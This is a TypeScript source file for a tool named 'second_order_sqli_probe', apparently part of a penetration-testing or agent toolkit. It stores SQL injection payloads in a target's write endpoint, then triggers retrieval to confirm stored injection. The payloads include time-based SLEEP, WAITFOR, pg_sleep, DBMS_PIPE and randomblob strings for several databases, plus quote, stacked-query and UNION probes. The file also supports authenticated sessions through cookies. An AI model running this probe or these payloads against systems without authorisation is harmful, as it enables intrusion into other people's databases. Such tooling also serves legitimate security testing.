// T64 — second_order_sqli_probe
// Write injection payload to storage, then trigger retrieval to observe
// time-delayed or content-delayed SQL injection effects.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'second_order_sqli_probe',
  description:
    'Second-order SQL injection probe. Writes injection payloads to the write endpoint (e.g. profile update, ' +
    'registration), then triggers retrieval via the read endpoint and observes time-delayed or content-delayed ' +
    'injection effects. Detects stored SQLi where input is sanitised at write-time but unsafely composed at read-time.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'write_url',     type: 'string', required: true,  description: 'URL to write/store the payload (POST)' },
    { name: 'write_field',   type: 'string', required: true,  description: 'Form field or JSON key to inject into at write-time' },
    { name: 'read_url',      type: 'string', required: true,  description: 'URL that retrieves/uses the stored value' },
    { name: 'read_field',    type: 'string', required: false, description: 'Read URL parameter (optional — if read is a GET with parameter)' },
    { name: 'session_cookie', type: 'string', required: false, description: 'Session cookie for authenticated requests' },
    { name: 'write_method',  type: 'string', required: false, description: 'Write HTTP method', default: 'POST' },
    { name: 'headers',       type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'delay_seconds', type: 'number', required: false, description: 'SLEEP/WAITFOR delay in seconds for blind confirmation', default: 5 },
    { name: 'timeout_ms',    type: 'number', required: false, description: 'Per-request timeout ms', default: 30000 },
  ],
};

export const secondOrderSqliProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const writeUrl = String(params.write_url || '');
    const writeField = String(params.write_field || '');
    const readUrl = String(params.read_url || '');
    const readField = params.read_field ? String(params.read_field) : undefined;
    const sessionCookie = params.session_cookie ? String(params.session_cookie) : undefined;
    const writeMethod = String(params.write_method || 'POST').toUpperCase();
    const delaySeconds = Math.min(30, Math.max(1, Number(params.delay_seconds || 5)));
    const timeoutMs = Number(params.timeout_ms || 30000);

    if (!writeUrl) return { output: 'write_url required', parsed: { error: 'missing_write_url' } };
    if (!writeField) return { output: 'write_field required', parsed: { error: 'missing_write_field' } };
    if (!readUrl) return { output: 'read_url required', parsed: { error: 'missing_read_url' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }
    if (sessionCookie) headers['Cookie'] = sessionCookie;

    // Payloads: test both time-based blind and error/content-based
    const payloads = [
      { name: 'mysql_sleep',       value: `genesis' AND SLEEP(${delaySeconds})-- -`,        db: 'mysql',  blind: true },
      { name: 'mssql_waitfor',     value: `genesis'; WAITFOR DELAY '0:0:${delaySeconds}'--`, db: 'mssql',  blind: true },
      { name: 'postgres_pg_sleep', value: `genesis'; SELECT pg_sleep(${delaySeconds})--`,    db: 'pgsql',  blind: true },
      { name: 'oracle_sleep',      value: `genesis' AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('x',${delaySeconds}))--`, db: 'oracle', blind: true },
      { name: 'sqlite_sleep',      value: `genesis' AND 1=randomblob(${delaySeconds * 100000000})/0--`, db: 'sqlite', blind: true },
      // Error-based (non-blind)
      { name: 'single_quote',      value: `genesis'`,                                         db: 'any',    blind: false },
      { name: 'double_quote',      value: `genesis"`,                                         db: 'any',    blind: false },
      { name: 'comment_dash',      value: `genesis'--`,                                       db: 'any',    blind: false },
      { name: 'stacked_query',     value: `genesis'; SELECT 1--`,                             db: 'any',    blind: false },
      { name: 'union_null',        value: `genesis' UNION SELECT NULL--`,                     db: 'any',    blind: false },
    ];

    const results: Array<{
      name: string; db: string; blind: boolean;
      write_status: number; read_status: number;
      read_time_ms: number; baseline_time_ms?: number;
      interesting: boolean; reason?: string; error?: string;
    }> = [];

    // Baseline read time (before any write)
    let baselineReadMs = 0;
    try {
      const t0 = Date.now();
      const c = new AbortController();
      const t = setTimeout(() => c.abort(), timeoutMs);
      const rdUrl = readField ? `${readUrl}${readUrl.includes('?') ? '&' : '?'}${readField}=genesis_baseline` : readUrl;
      await fetch(rdUrl, { headers, signal: c.signal });
      clearTimeout(t);
      baselineReadMs = Date.now() - t0;
    } catch { /* ignore */ }

    for (const p of payloads) {
      try {
        // Step 1: Write payload
        const wc = new AbortController();
        const wt = setTimeout(() => wc.abort(), timeoutMs);
        let writeStatus = 0;
        if (writeMethod === 'GET') {
          const sep = writeUrl.includes('?') ? '&' : '?';
          const wr = await fetch(`${writeUrl}${sep}${writeField}=${encodeURIComponent(p.value)}`, { headers, signal: wc.signal });
          writeStatus = wr.status;
        } else {
          const wr = await fetch(writeUrl, { method: writeMethod, headers: { ...headers, 'Content-Type': 'application/x-www-form-urlencoded' }, body: `${writeField}=${encodeURIComponent(p.value)}`, signal: wc.signal });
          writeStatus = wr.status;
        }
        clearTimeout(wt);

        // Step 2: Trigger read
        const t0 = Date.now();
        const rc = new AbortController();
        const rt = setTimeout(() => rc.abort(), timeoutMs);
        const rdUrl = readField ? `${readUrl}${readUrl.includes('?') ? '&' : '?'}${readField}=${encodeURIComponent(p.value)}` : readUrl;
        const readResp = await fetch(rdUrl, { headers, signal: rc.signal });
        clearTimeout(rt);
        const readTimeMs = Date.now() - t0;
        const readStatus = readResp.status;
        const readBody = await readResp.text();

        // Detection logic
        let interesting = false;
        let reason = '';
        if (p.blind) {
          // Time-based: triggered delay if read_time > delay * 800ms threshold (generous for network jitter)
          if (readTimeMs > (delaySeconds * 1000 * 0.8) && readTimeMs > baselineReadMs + 1000) {
            interesting = true;
            reason = `time-based: ${readTimeMs}ms vs baseline ${baselineReadMs}ms (expected delay ${delaySeconds}s)`;
          }
        } else {
          // Error-based: look for DB error strings in response
          const dbErrors = /sql|syntax|ora-\d|mysql|pg::|unclosed|unterminated|quoted|near.*error/i;
          if (dbErrors.test(readBody)) {
            interesting = true;
            reason = 'DB error string in response body';
          }
        }

        results.push({ name: p.name, db: p.db, blind: p.blind, write_status: writeStatus, read_status: readStatus, read_time_ms: readTimeMs, baseline_time_ms: baselineReadMs, interesting, reason: reason || undefined });
      } catch (err) {
        results.push({ name: p.name, db: p.db, blind: p.blind, write_status: 0, read_status: 0, read_time_ms: 0, interesting: false, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `second_order_sqli_probe — write→read SQLi test`,
      `Write: ${writeUrl.substring(0, 60)}  field="${writeField}"`,
      `Read:  ${readUrl.substring(0, 60)}`,
      `Baseline read time: ${baselineReadMs}ms`,
      `Injection confirmed: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ SQLI CONFIRMED' : r.error ? '✗ ERR           ' : '  ·             ';
      lines.push(`  ${flag}  [${r.name.padEnd(22)}]  db=${r.db.padEnd(7)}  write=${r.write_status}  read=${r.read_status}  t=${r.read_time_ms}ms${r.reason ? `  → ${r.reason}` : ''}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { baseline_read_ms: baselineReadMs, interesting_count: interesting.length, interesting, results },
    };
  },
};
